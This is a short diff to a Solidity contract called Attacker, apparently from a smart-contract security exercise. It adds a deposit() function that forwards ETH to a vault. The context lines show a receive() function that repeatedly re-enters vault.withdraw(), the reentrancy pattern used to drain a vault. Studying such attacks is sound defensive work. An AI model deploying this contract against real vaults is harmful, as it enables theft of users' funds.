@@ -18,6 +18,11 @@ contract Attacker {
         vault.withdraw();
     }
 
+    function deposit() external payable {
+        require(msg.value > 0, "send some ETH to deposit");
+        vault.deposit{value: msg.value}();
+    }
+
     receive() external payable {
         if (address(vault).balance >= msg.value) {
             vault.withdraw();
